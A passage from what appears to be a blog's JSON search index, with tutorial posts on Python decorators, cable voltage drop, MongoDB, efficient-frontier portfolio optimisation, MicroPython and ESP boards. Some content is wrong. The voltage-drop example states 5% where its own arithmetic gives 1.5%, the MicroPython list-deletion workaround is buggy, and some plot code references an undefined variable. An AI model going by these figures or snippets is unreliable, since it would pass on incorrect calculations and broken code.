\" + name def preFunction ( function ): print ( \"This is the prefunction function\" ) print ( hello ()) preFunction ( hello ) # output: \"This is the prefunction function\" # \"Hello Jack\" Now you have all the knowledge to learn what decorators really are, they let you execute code before and after a function. The code above is actually a decorator, but let's make it more usable. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def new_decorator ( function ): def functionWrapped (): print ( \"This is the pre function\" ) function () print ( \"This is the post function\" ) return functionWrapped def function_requiring_decoration (): print ( \"I need some decorations!\" ) function_requiring_decoration () # output: \"I need some decorations\" function_requiring_decoration = new_decorator ( function_requiring_decoration ) # Now our function is wrapped by functionWrapped() function_requiring_decoration () # output: \"This is the pre function\" # \"I need some decoration\" # \"This is the post function\" Now you've made a decorator! We've just used what we learned previously to modify it's behaviour in one way or another. Now to make it even more concise we can just the @ symbol. Here is how we could have used the previous code with @ symbol. 1 2 3 4 5 6 7 8 9 10 11 @new_decorator def function_requiring_decoration (): print ( \"I need some decorations!\" ) function_requiring_decoration () # output: \"This is the pre function\" # \"I need some decoration\" # \"This is the post function\" # The @ operator is a short way of saying: function_requiring_decoration = new_decorator ( function_requiring_decoration ) Hopefully now you are ready to go and explore the world of decorators within Python, they can be used quite powerfully and allow for you to reuse code and extend capabilities. Some of the best examples for decorators are for authentication or logging, however I will not cover them as they are extensively documented over the internet.","tags":"Python","url":"https://jackmckew.dev/python-decorators-explained.html","loc":"https://jackmckew.dev/python-decorators-explained.html"},{"title":"Explained: Voltage Drop","text":"Voltage drop is a electrical phenomenon in that wires carrying current always have resistance, or impedance to the current flow. Voltage drop is defined as the amount of loss that occurs through part of or all of a circuit due to resistance/impedance. The most well known analogy for explaining voltage, current and voltage drop is a hose carrying water. In the garden hose, the water pressure is the voltage, the amount of water flowing is the current and the type and size of the hose makes up the resistance. Thus meaning that voltage drop is the loss of water pressure from the supply end of the hose to the output. When designing electrical systems within Australia and New Zealand, we are required to design to Australian standards. For voltage drop, the relevant standards as AS/NZS3000 (Wiring Rules) and AS/NZS3008 (Cable Selection). Where AS/NZS3000 nominates the limits to conform to (5% maximum from point of supply) and AS3008 dictates multiple ways that voltage drop can be calculated. For this post, I will demonstrate a simplified method that is outlined in AS3000 Table C7 where it specifies 'Am per %Vd' (Amp meters per % voltage drop) for each cable size: Cable Conductor Size Single Phase (230V) Am per %Vd Three Phase (400V) Am per %Vd 1mm&#94;2&#94; 45 90 1.5mm&#94;2&#94; 70 140 2.5mm&#94;2&#94; 128 256 4mm&#94;2&#94; 205 412 6mm&#94;2&#94; 306 615 10mm&#94;2&#94; 515 1034 16mm&#94;2&#94; 818 1643 25mm&#94;2&#94; 1289 2588 35mm&#94;2&#94; 1773 3560 50mm&#94;2&#94; 2377 4772 70mm&#94;2&#94; 3342 6712 95mm&#94;2&#94; 4445 8927 For example, a 50m run of 10mm\\&#94;2&#94; cable carrying 3 phase 32A will result in 5% drop: 32A * 50m = 1600 / 1034 = 1.5%. In future posts, I will go into the various ways that AS/NZS3008 demonstrates ways of calculating voltage drop.","tags":"Engineering","url":"https://jackmckew.dev/explained-voltage-drop.html","loc":"https://jackmckew.dev/explained-voltage-drop.html"},{"title":"What is MongoDB?","text":"Recently after looking for a different flavour of database apart from MySQL (which is what I am personally use to), I had always heard about MongoDB. So after some investigation, I found that MongoDB has a platform MongoDB University to familiarize yourself with their product. I completed their very first introductory course M001: MongoDB Basics last week, I found it very gentle in the introduction to database management and exploring data sets. This post is dedicated my take on the course and the key takeaways from my point of view. The course is broken into multiple chapters in which a chapter is released each week for the duration of the course. For example, the basics course was broken up into: Intro to MongoDB, Mongo Compass and Basic Queries, Create, Read, Update and Delete (CRUD) operations and more, MongoDB queries. Following all the chapters, you are faced with a final exam which tests if you were participating/listening in the earlier chapters. If you are concerned that you may struggle, this final exam is made up of a few multiple choice questions based on querying the data sets used in the chapters. MongoDB is a open source document-oriented database program, classified as a NoSQL database and utilizes JSON-like documents with a schema. They also provide a tool to help sift through the database called 'Compass'. Personally, I really enjoy the functionality within Compass with plotting geographical data, presenting data type variances across the fields in a document and many other features. I found Compass one of the most appealing features as someone that constantly seeks to gain insight from data. Queries within MongoDB are structured like a dictionary in Python, where the field in the document is passed the key and the criteria is the value. For example, a basic query to return all documents within a MongoDB database with score equal to 7 would be: 1 { score : 7 } As a mainly Python developer, I found this to be very appealing as I find myself using dictionaries constantly when writing Python code, and by MongoDB using this format makes for an easy connection between the two. CRUD operations, are the fundamentals on actually using a database usefully. Through the Mongo shell you are able to add documents to the MongoDB database through JSON, XML, etc data formats. Projections within MongoDB are used to specify or restrict the fields to return with the filtered documents if you are specifically looking at a few fields within a densely populated document. In addition to the way queries are structured for filtering documents, it is also possible to use one of the many query or projection operators to further filter the documents. For example a query to return all documents with a score greater than 7 would be: 1 { score : { $ gte : 7 }} This sums up all of the takeaways from the M001 course for MongoDB that I found. I look forward to taking more of the courses on MongoDB university to gain a greater understanding and be able to utilise MongoDB across some of my projects.","tags":"Software Development","url":"https://jackmckew.dev/what-is-mongodb.html","loc":"https://jackmckew.dev/what-is-mongodb.html"},{"title":"Efficient Frontier for Balancing Portfolios","text":"Following last 2 weeks' posts ( Python for the Finance Industry & Portfolio Balancing with Historical Stock Data ), we now know how to extract historical records on stock information from the ASX through an API, present it in a graph using matplotlib, and how to balance a portfolio using randomly generated portfolios. This post is to demonstrate a method in balancing portfolios that does not depend on generating random portfolios, but rather mathematically determining the extremities of boundaries for effective portfolios using the SciPy optimize function (similar to that of Excel's 'solver' ). Returning to last weeks' post when the budget allocations to assets were determined from randomly generated portfolios, it was presented on the graph below: From this plot, it can be visualized that it forms an arch line between the yellow and red crosses. This line is called the efficient frontier . The efficient frontier represents the set of optimal portfolios that offer the highest expected return for a defined level of risk or the lowest risk for a given level of expected return. Simply this means, all the dots (portfolios) to the right of the line will give you a higher risk for the same returns. First of all we must mathematically determine the portfolio with the maximum Sharpe ratio as the greater a portfolio's Sharpe ratio, the better it's risk-adjusted performance. Sharpe ratio is calculated using the formula below: To find the maximum of the Sharpe Ratio programmatically we follow these steps: Firstly, define the formula as the function neg_sharpe_ratio (take note that to find the maximum of function in SciPy , we use the minimize function with an inverse sign), In the max_sharpe_ratio function, define arguments to be passed into the SciPy minimize function: neg_sharpe_ratio: function to be minimized, num*[1/num_assets]: initial guess which is evenly distributed array of values, Arguments that are to be passed into the objective function (neg_sharpe_ratio), Method of Sequential Lease Squares Programming, there are many others which can be seen here, Bounds: between 0% and 100% of our budget allocation, Constraints: given as a dictionary, 'eq' type for equality and 'fun' for the anonymous function which limits the total summed asset allocation to 100% of the budget. The result from the minimize function is returned as a OptimizeResult type. 1 2 3 4 5 6 7 8 9 10 11 12 def neg_sharpe_ratio ( weights , average_returns , covariance_matrix , risk_free_rate ): returns , volatility = portfolio_performance ( weights , average_returns , covariance_matrix ) return - ( returns - risk_free_rate ) / volatility def max_sharpe_ratio ( average_returns , covariance_matrix , risk_free_rate ): num_assets = len ( average_returns ) args = ( average_returns , covariance_matrix , risk_free_rate ) constraints = ({ 'type' : 'eq' , 'fun' : lambda x : np . sum ( x ) - 1 }) bound = ( 0 , 1 ) bounds = tuple ( bound for asset in range ( num_assets )) result = sco . minimize ( neg_sharpe_ratio , num_assets * [ 1 / num_assets ,], args = args , method = 'SLSQP' , bounds = bounds , constraints = constraints ) return result Similarly to the maximum sharpe ratio we do the same for determining the minimum volatility portfolio programmatically. We minimise volatility by trying different weightings on our asset allocations to find the minima. 1 2 3 4 5 6 7 8 9 10 11 12 13 def portfolio_volatility ( weights , average_returns , covariance_matrix ): return portfolio_performance ( weights , average_returns , covariance_matrix )[ 1 ] def min_variance ( average_returns , covariance_matrix ): num_assets = len ( average_returns ) args = ( average_returns , covariance_matrix ) constraints = ({ 'type' : 'eq' , 'fun' : lambda x : np . sum ( x ) - 1 }) bound = ( 0.0 , 1.0 ) bounds = tuple ( bound for asset in range ( num_assets )) result = sco . minimize ( portfolio_volatility , num_assets * [ 1. / num_assets ,], args = args , method = 'SLSQP' , bounds = bounds , constraints = constraints ) return result As above, we can also draw a line which depicts the efficient frontier for the portfolios for a given risk rate. Below some functions are defined for computing the efficient frontier. The first function, efficient_return is calculating the most efficient portfolio for a given target return, and the second function efficient frontier is compiling the most efficient portfolio for a range of targets. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def efficient_return ( average_returns , covariance_matrix , target ): num_assets = len ( average_returns ) args = ( average_returns , covariance_matrix ) def portfolio_return ( weights ): return portfolio_performance ( weights , average_returns , covariance_matrix )[ 0 ] constraints = ({ 'type' : 'eq' , 'fun' : lambda x : portfolio_return ( x ) - target }, { 'type' : 'eq' , 'fun' : lambda x : np . sum ( x ) - 1 }) bounds = tuple (( 0 , 1 ) for asset in range ( num_assets )) result = sco . minimize ( portfolio_volatility , num_assets * [ 1. / num_assets ,], args = args , method = 'SLSQP' , bounds = bounds , constraints = constraints ) return result def efficient_frontier ( average_returns , covariance_matrix , returns_range ): efficients = [] for ret in returns_range : efficients . append ( efficient_return ( average_returns , covariance_matrix , ret )) return efficients Now it's time to plot the efficient frontier on the graph with the randomly selected portfolios to check if they have been calculated correctly. It is also an opportune time to check if the maximum Sharpe ratio and minimum volatility portfolios have been calculated correctly by comparing them to the previously randomly determined portfolios. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 def display_efficient_frontier ( average_returns , covariance_matrix , num_portfolios , risk_free_rate ): results , weights = generate_portfolios ( num_portfolios , average_returns , covariance_matrix , risk_free_rate ) max_sharpe = max_sharpe_ratio ( average_returns , covariance_matrix , risk_free_rate ) max_sharpe_return , max_sharpe_volatility = portfolio_performance ( max_sharpe [ 'x' ], average_returns , covariance_matrix ) max_sharpe_allocations = allocations_ef ( max_sharpe . x , stocks_df ) . T print ( \"MAX SHARPE RATIO \\n \" ) print ( \"Return: {0:.2f} \" . format ( max_sharpe_return )) print ( \"Volatility: {0:.2f} \" . format ( max_sharpe_volatility )) print ( max_sharpe_allocations ) min_vol = min_variance ( average_returns , covariance_matrix ) min_vol_return , min_vol_volatility = portfolio_performance ( min_vol [ 'x' ], average_returns , covariance_matrix ) min_vol_allocations = allocations_ef ( min_vol . x , stocks_df ) . T print ( \" \\n MINIMUM VOLATILITY \\n \" ) print ( \"Return: {0:.2f} \" . format ( min_vol_return )) print ( \"Volatility: {0:.2f} \" . format ( min_vol_volatility )) print ( min_vol_allocations ) an_vol = np . std ( returns ) * np . sqrt ( 253 ) an_rt = average_returns * 253 for i , txt in enumerate ( stocks_df . columns ): print ( txt , \":\" , \"Annuaised return\" , round ( an_rt [ i ], 2 ), \", Annualised volatility:\" , round ( an_vol [ i ], 2 )) plt . figure ( figsize = ( 10 , 7 )) plt . scatter ( results [ 0 ,:], results [ 1 ,:], c = results [ 2 ,:], cmap = 'YlGnBu' , marker = 'o' , s = 10 , alpha = 0.3 ) plt . colorbar () plt . scatter ( max_sharpe_volatility , max_sharpe_return , marker = 'X' , color = 'r' , s = 400 , label = 'Maximum Sharpe ratio' ) plt . scatter ( min_vol_volatility , min_vol_return , marker = 'X' , color = 'y' , s = 400 , label = 'Minimum volatility' ) target = np . linspace ( min_vol_return , max ( an_rt ), 50 ) efficient_portfolios = efficient_frontier ( average_returns , covariance_matrix , target ) plt . plot ([ p [ 'fun' ] for p in efficient_portfolios ], target , linestyle = '-.' , color = 'white' , label = 'efficient frontier' ) plt . title ( 'Calculated Portfolio Optimization based on Efficient Frontier' ) plt . xlabel ( 'Volatility' ) plt . ylabel ( 'Returns' ) plt . legend ( labelspacing = 0.8 ) def allocations_ef ( solution , stocks_df ): allocation = pd . DataFrame ( solution , index = stocks_df . columns , columns = [ 'allocation' ]) return allocation returns = stocks_df . pct_change () average_returns = returns . mean () covariance_matrix = returns . cov () num_portfolios = 25000 risk_free_rate = 0.01977 display_efficient_frontier ( average_returns , covariance_matrix , num_portfolios , risk_free_rate ) The surprising part is that the calculated result is very close to what we have previously simulated by picking from randomly generated portfolios. The slight differences in allocations between the simulated vs calculated are in most cases less than 1%, which shows how powerful randomly estimating calculations can be albeit sometimes not reliable in small sample spaces. Rather than plotting every randomly generated portfolio, we can plot the individual stocks on the plot with the corresponding values of each stock's return and risk. This way we can compare how diversification is lowering the risk by optimizing the allocations. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 def display_efficient_frontier_selected ( average_returns , covariance_matrix , risk_free_rate ): max_sharpe = max_sharpe_ratio ( average_returns , covariance_matrix , risk_free_rate ) max_sharpe_return , max_sharpe_volatility = portfolio_performance ( max_sharpe [ 'x' ], average_returns , covariance_matrix ) max_sharpe_allocations = allocations_ef ( max_sharpe . x , stocks_df ) . T print ( \"MAX SHARPE RATIO \\n \" ) print ( \"Return: {0:.2f} \" . format ( max_sharpe_return )) print ( \"Volatility: {0:.2f} \" . format ( max_sharpe_volatility )) print ( max_sharpe_allocations ) min_vol = min_variance ( average_returns , covariance_matrix ) min_vol_return , min_vol_volatility = portfolio_performance ( min_vol [ 'x' ], average_returns , covariance_matrix ) min_vol_allocations = allocations_ef ( min_vol . x , stocks_df ) . T print ( \" \\n MINIMUM VOLATILITY \\n \" ) print ( \"Return: {0:.2f} \" . format ( min_vol_return )) print ( \"Volatility: {0:.2f} \" . format ( min_vol_volatility )) print ( min_vol_allocations ) an_vol = np . std ( returns ) * np . sqrt ( 253 ) an_rt = average_returns * 253 for i , txt in enumerate ( stocks_df . columns ): print ( txt , \":\" , \"Annuaised return\" , round ( an_rt [ i ], 2 ), \", Annualised volatility:\" , round ( an_vol [ i ], 2 )) plt . figure ( figsize = ( 10 , 7 )) plt . scatter ( an_vol , an_rt , marker = 'o' , s = 200 ) for i , txt in enumerate ( stocks_df . columns ): plt . annotate ( txt , ( an_vol [ i ], an_rt [ i ]), xytext = ( 10 , 0 ), textcoords = 'offset points' ) plt . scatter ( max_sharpe_volatility , max_sharpe_return , marker = 'X' , color = 'r' , s = 400 , label = 'Maximum Sharpe ratio' ) plt . scatter ( min_vol_volatility , min_vol_return , marker = 'X' , color = 'y' , s = 400 , label = 'Minimum volatility' ) target = np . linspace ( min_vol_return , max ( an_rt ), 50 ) efficient_portfolios = efficient_frontier ( average_returns , covariance_matrix , target ) plt . plot ([ p [ 'fun' ] for p in efficient_portfolios ], target , linestyle = '-.' , color = 'white' , label = 'efficient frontier' ) plt . title ( 'Calculated Portfolio Optimization based on Efficient Frontier' ) plt . xlabel ( 'Volatility' ) plt . ylabel ( 'Returns' ) plt . legend ( labelspacing = 0.8 ) display_efficient_frontier_selected ( average_returns , covariance_matrix , risk_free_rate ) From the plot above, the stock with the highest risk is BHP, which accompanies the highest returns. This shows that if the investor is willing to take the risk than they will be rewarded with the higher return. This concludes the 3 part series on Python in the finance industry, if there is any topics in particular you would like to see how software can integrate and improve a service/product please feel free to get in touch!","tags":"Python","url":"https://jackmckew.dev/efficient-frontier-for-balancing-portfolios.html","loc":"https://jackmckew.dev/efficient-frontier-for-balancing-portfolios.html"},{"title":"Portfolio Balancing with Historical Stock Data","text":"Following last weeks' post ( Python for the Finance Industry ). This post is to demonstrate a method of determining an optimized portfolio based on historical stock price data. First of all while attempting to tackle this problem, I stumbled across many very informative articles in which based on what I learned throughout reading them, and trying to replicate their findings with the ASX stocks' data. Ricky Kim ( Efficient Frontier Portfolio Optimisation in Python) Bernard Brenyah ( Markowitz's Efficient Frontier in Python) Now I will not be going into how Markowit'z Efficient Frontier Portfolio Optimization & Sharpe Ratios works as these techniques are extremely well documented across this internet and very easily found. This post will be for implementing these techniques in Python to apply them to an ASX based portfolio. Picking up from the end of the previous post, we had just plotted the percentage change over the time period for our stocks' data. For the sake of this post we will be using a technique called random optimization, where will be taking a number of random attempts and selecting the best one. Further posts will show a more detailed approach to this optimization problem. Now there are multiple steps before we get to the desired outcome of a balanced portfolio. Generate X number of 'random' portfolios, Rate their performance against one another, Pick the desired solution. To generate random portfolios, we define a function such that we can pass it differing variables as to tweak our outcomes in the future. 1 2 3 4 5 6 7 8 9 10 11 12 def generate_portfolios ( num_portfolios , average_returns , covariance_matrix , risk_free_rate ): results = np . zeros (( 3 , num_portfolios )) weights_record = [] for portfolio in range ( num_portfolios ): weights = np . random . random ( len ( companies ) - 1 ) weights /= np . sum ( weights ) weights_record . append ( weights ) returns , volatility = portfolio_performance ( weights , average_returns , covariance_matrix ) results [ 0 , portfolio ] = volatility results [ 1 , portfolio ] = returns results [ 2 , portfolio ] = ( returns - risk_free_rate ) / volatility return results , weights_record To step through this function: Define empty location for our portfolio performance results to be stored along with recording weights so we can extract them once selected, For each portfolio to be generated, give a random 'weighting' for each of the company that we have historical data on (eg, 23% NAB.AX), Even out the distribution of the weights such that the sum of the weightings is 100% (eg, total budget), Record the weightings generated in our memory location, Determine the performance of our randomly generated portfolio (more on that soon), Fill in the portfolio performance results for this generated portfolio and repeat for X number of portfolios. In step 5 above, we have to determine how to rank the generated portfolios against each other to work out how to filter our results. To do this, we calculate volatility of the portfolio using the following formula: Bernard Brenyah , whom I mentioned at the beginning of the post, has provided a clear explanation of how the above formula can be expressed in matrix calculation in one of his blog post s. In which we just take the matrix calculation and multiply by 253 for number of trading days in Australia. 1 2 3 4 5 def portfolio_performance ( weights , average_returns , covariance_matrix ): returns = np . sum ( weights * average_returns ) * 253 variance = np . dot ( weights . T , np . dot ( covariance_matrix , weights )) volatility = np . sqrt ( variance ) * np . sqrt ( 253 ) return returns , volatility Now that we have X number of randomly generated portfolios, all ranked against one another, it's time to plot so that our results can be visualized. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 def display_random_efficient_frontier ( average_returns , covariance_matrix , num_portfolios , risk_free_rate ): results , weights = generate_portfolios ( num_portfolios , average_returns , covariance_matrix , risk_free_rate ) max_sharpe_index = np . argmax ( results [ 2 ]) max_volatility = results [ 0 , max_sharpe_index ] max_return = results [ 1 , max_sharpe_index ] max_sharpe_allocations = allocations ( max_sharpe_index , weights , stocks_df ) . T print ( \"MAX SHARPE RATIO \\n \" ) print ( \"Return: {0:.2f} \" . format ( max_return )) print ( \"Volatility: {0:.2f} \" . format ( max_volatility )) print ( max_sharpe_allocations ) min_vol_index = np . argmin ( results [ 0 ]) min_volatility = results [ 0 , min_vol_index ] min_return = results [ 1 , min_vol_index ] min_vol_allocations = allocations ( min_vol_index , weights , stocks_df ) . T print ( \" \\n MINIMUM VOLATILITY \\n \" ) print ( \"Return: {0:.2f} \" . format ( min_return )) print ( \"Volatility: {0:.2f} \" . format ( min_volatility )) print ( min_vol_allocations ) plt . figure ( figsize = ( 10 , 7 )) plt . scatter ( results [ 0 ,:], results [ 1 ,:], c = results [ 2 ,:], cmap = 'YlGnBu' , marker = 'o' , s = 10 , alpha = 0.3 ) plt . colorbar () plt . scatter ( max_volatility , max_return , marker = 'X' , color = 'r' , s = 400 , label = 'Maximum Sharpe ratio' ) plt . scatter ( min_volatility , min_return , marker = 'X' , color = 'y' , s = 400 , label = 'Minimum volatility' ) plt . title ( 'Simulated Portfolio Optimization based on Efficient Frontier' ) plt . xlabel ( 'Volatility' ) plt . ylabel ( 'Returns' ) plt . legend ( labelspacing = 0.8 ) def allocations ( index , weights , stocks_df ): allocation = pd . DataFrame ( weights [ index ], index = stocks_df . columns , columns = [ 'allocation' ]) return allocation Using the above function 'display_random_efficient_frontier', this will determine our max sharpe ratio portfolio generated and the minimum volatility portfolio with their respective returns. Now it is entirely up to the trader on how much risk they are willing to take on board with their portfolio. With the settings below in conjunction with the previously defined functions and stock data to generate the portfolios (risk free rate determined from this website ). 1 2 3 4 5 6 7 returns = stocks_df . pct_change () mean_returns = returns . mean () cov_matrix = returns . cov () num_portfolios = 25000 risk_free_rate = 0.01977 display_random_efficient_frontier ( mean_returns , cov_matrix , num_portfolios , risk_free_rate ) With the two portfolios determined, the one gives us the best risk-adjusted (as long as the trader is prepared to take the risk) is the one with the maximum Sharpe ratio, allocating a 67% portion to WOW and 32% to BHP, as these stocks were quite volatile from the daily percentage change calculations. On the other hand, the minimum volatility portfolio is reflecting the more stable of the stocks from the daily percentage change calculations distributing portions over NAB and TLS due to their stability from the percentage change calculations and reducing the portion to WOW.","tags":"Python","url":"https://jackmckew.dev/portfolio-balancing-with-historical-stock-data.html","loc":"https://jackmckew.dev/portfolio-balancing-with-historical-stock-data.html"},{"title":"Python for the Finance Industry","text":"This is the first post in a series of posts dedicated for demonstrating how Python can be applied in the finance industry. Personally, the first thing that comes to mind when I think of the finance industry is the stock market. For fellow Australians, our main stock exchange is the Australian Securities Exchange (ASX). For those who are reading who are not familiar with stocks, there is a plethora of information around stocks across the internet. When it comes to using Python with stocks, the very first thing that you will require, is data. Thankfully, there are multitudes of services out there which provide this data through application programming interfaces (APIs). The data is provided through APIs in a few common formats: JSON, XML, CSV. For this post, I will be utilising the free service, Alpha Vantage, to request historical records of stock information on the ASX. For access to Alpha Vantage's API, head to http://www.alphavantage.co/support/#api-key and register for a free API key. There is also documentation around testing if your API key is operational on the Alpha Vantage website. Now that we have access to an API in which we can extract historical records of stock information in the ASX, it's time to manipulate and analyse the data. As in my previous post Episode 8 â€“ Anaconda , I recommend setting up a virtual environment or anaconda environment to install & manage dependencies of external libraries. The packages required for this post in the series are: Pandas (For manipulating the data), Alpha_vantage (To access the historical records through an API), NumPy (For processing across the data), Matplotlib (For visualising and generate plots of the data). To import these libraries into our Python code the following\\ code is required: 1 2 3 4 import pandas as pd from alpha_vantage.timeseries import TimeSeries import matplotlib.pyplot as plt import numpy as np Now that we have imported the packages required to extract,\\ process and display the data. The first step is to extract the data in a useful\\ format from the Alpha Vantage API. First declare a list with all the companies ASX names with the suffix \".AX\" to denominate that it's from the ASX. After that initialise an empty pandas dataframe to be filled with the data to analyse. Now iterate over the list, calling a request through the API to request the data that is required. There are multiple formats of data to be extracted through the API which is detailed in the Alpha_Vantage documentation . For this post, I have used the get_daily function from the timeseries object in alpha_vantage to extract the daily information on a stock for the past 20 years, in particular, the closing value. 1 2 3 4 5 6 7 8 9 10 companies = [ 'NAB.AX' , 'WOW.AX' , 'TLS.AX' , 'BHP.AX' ] stocks_df = pd . DataFrame () for company in companies : data , meta_data = ts . get_daily ( symbol = company , outputsize = 'full' ) print ( data . head ()) stocks_df [ company ] = pd . Series ( data [ '4. close' ]) print ( stocks_df . head ()) Now that the dataframe is full of closing values for the companie's stock's closing values, it's time to begin processing. First of all, for any missing data or erroneous 0 values, the ffill() function is used to fill any missing value by propagating the last valid observation forward. After that, the timestamp on each row is forced to become the index of the dataframe and converted to a datetime type. 1 2 3 stocks_df = stocks_df . replace ( 0 , pd . np . nan ) . ffill () stocks_df . index = pd . to_datetime ( stocks_df [ \"date\" ]) stocks_df = stocks_df . drop ( \"date\" , axis = 1 ) Now that the data has gone through it's pre-processing phase, it's time to begin plotting some figures. To begin, a basic figure, plotting a single for each company's stock price over the past 20 years on a single line graph to enable comparison between the companies. 1 2 3 4 5 6 plt . figure ( figsize = ( 14 , 7 )) for column in stocks_df . columns . values : plt . plot ( stocks_df . index , stocks_df [ column ], lw = 3 , alpha = 0.8 , label = c ) plt . legend ( loc = 'upper left' , fontsize = 12 ) plt . ylabel ( 'price in $' ) plt . show () Another way to plot this data is to show it as the percentage change from the day before AKA daily returns. By plotting the data in this way, instead of showing the actual prices, the graph is showing the stocks' volatility. 1 2 3 4 5 6 7 8 returns = stocks_df . pct_change () plt . figure ( figsize = ( 14 , 7 )) for column in returns . columns . values : plt . plot ( returns . index , returns [ column ], lw = 3 , alpha = 0.8 , label = c ) plt . legend ( loc = 'upper left' , fontsize = 12 ) plt . ylabel ( 'daily returns' ) plt . show () Now that we have some insight to the stocks' data, the next post in this series will demonstrate a way to calculate a balanced portfolio from historical records using Modern Portfolio Theory.","tags":"Python","url":"https://jackmckew.dev/python-for-the-finance-industry.html","loc":"https://jackmckew.dev/python-for-the-finance-industry.html"},{"title":"How to Program an ESP8266 with MicroPython","text":"Following the previous two weeks of topics, Introduction to ESP32/ESP8266 and What is MicroPython? . I wrote an article on maker.pro in which I describe how to program the ESP8266 with MicroPython in detail.","tags":"Engineering","url":"https://jackmckew.dev/how-to-program-an-esp8266-with-micropython.html","loc":"https://jackmckew.dev/how-to-program-an-esp8266-with-micropython.html"},{"title":"What is MicroPython?","text":"From the MicroPython docs themselves \"MicroPython is a lean and efficient implementation of the Python 3 programming language that includes a small subset of the Python standard library and is optimised to run on microcontrollers and in constrained environments.\". But what does all this mean? Python 3 is one of the most widely used, easy to write/read programming languages in the world that is rapidly growing. By default Python comes with a â€˜standard library' which includes basic functions such as if statements, loops, printing, etc. Where MicroPython comes in is that the standard library for Python might take up valuable space/computations to run as efficiently it does on a PC, so MicroPython is a slice of the standard library that is able to run more efficiently and take up less space on a microcontroller (RAM and space is crucial when working with microcontrollers). MicroPython also comes with an interactive REPL (Read-Evaluate-Print Loop), which is an often overlooked amazing feature of MicroPython. The REPL allows you to connect to a microcontroller, execute code quickly without the need to compile or upload code. Which gives immediate feedback on whether your program is working as intended. Differences between MicroPython & Python There obviously had to be some changes between Python and MicroPython to make it work efficiently on processors a fraction of the power, but what are they? If you are a beginner-intermediate Python programmer, you'll only run into trouble in very specific scenarios, which can be easily worked around. For example you cannot delete from a list with a step greater than 1. Sample Python Code 1 2 3 L = [ 1 , 2 , 3 , 4 ] del ( L [ 0 : 4 : 2 ]) print ( L ) You'd expect for the output here in Python normally to be: Python Output MicroPython Output [2,4] TypeError: object 'range' isn't a tuple or list However this can be easily worked around with an explicit loop for example: Sample MicroPython/Python Code 1 2 3 4 L = [ 1 , 2 , 3 , 4 ] for i in L : if ( i % 2 == 0 ): del ( L [ i ]) For more information on differences between Python (in particular CPython) and MicroPython you can find the MicroPython documentation here: http://docs.micropython.org/en/latest/genrst/index.html","tags":"Python","url":"https://jackmckew.dev/what-is-micropython.html","loc":"https://jackmckew.dev/what-is-micropython.html"},{"title":"Introduction to ESP32/ESP8266","text":"What is an ESP32/ESP8266 The ESP32 and ESP8266 are low-cost Wi-Fi modules, which are perfect for DIY Internet of Things (IoT) projects. They both come with general purpose input/output pins (GPIOs), support a variety of protocols such as SPI, I2C, UART and many more. The most attractive part of the ESP range is that they come with wireless networking included, separating them from their Arduino microcontroller counterparts. All in all, the ESP series allows you to easily control/monitor devices remotely using Wi-Fi for a very low price. ESP32 vs ESP8266 The ESP32 is the later â€˜model' of the ESP8266. It added a whole suite of new functionality such as: touch sensitive pins, built-in temperature and hall effect sensors and upgraded from single core CPU to a dual core, faster Wi-FI, more GPIOs and now supports Bluetooth and BLE (Bluetooth Low Energy). While both boards are very low-cost, the ESP32 costs slightly more, the ESP8266 (here in Australia) costs around \\~\\ \\(10AU, and the ESP32 around \\~\\\\) 22AU. Flavours of ESP boards There are currently many different varieties of ESP flavours you can buy off the shelf, while if you are more into developing the board around your ESP module (the pictures above) you can simply just purchase the relevant ESP module, or if you are like me and don't want to bother soldering and developing your own board there is a solutions for you!\\ ESP32 Development Boards ESP32 Thing - Sparkfun The ESP32 Thing comes with all the functionalities to easily communication and program the ESP32 with your computer (including a on-board USB-Serial). It also features a LiPo charger, so your ESP32 project can use rechargeable batteries without having to solder any terminals and make it easy to replace/disconnect the battery pack. Espressif ESP32 Development Board - Developer Edition If you're not confident on soldering the header pins on the Sparkfun Thing board, then the Espressif board comes with that done for you! The header pins are also nicely spaced out so if you are a breadboard enthusiast, you can just plug and play on your breadboard and start connecting all your header wires. ESP8266 Development Boards NodeMCU The NodeMCU is my personal favourite ESP flavour board because it is friendly to your breadboard, has an on-board USB-Serial and can be powered by USB. This all means that you can test and develop your board straight out of the box without fiddling around with soldering pins, voltages or getting any extra components (except a Micro-usb cable). Adafruit Huzzah ESP8266 Breakout The Huzzah board is Adafruits answer to other development boards that weren't friendly to breadboards, didn't have on-board voltage regulators and weren't CE or FCC emitter certified. The Huzzah board comes with all these functionalities, although unlike the NodeMCU you will need to get a USB-Serial cable to able to program your Huzzah board. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 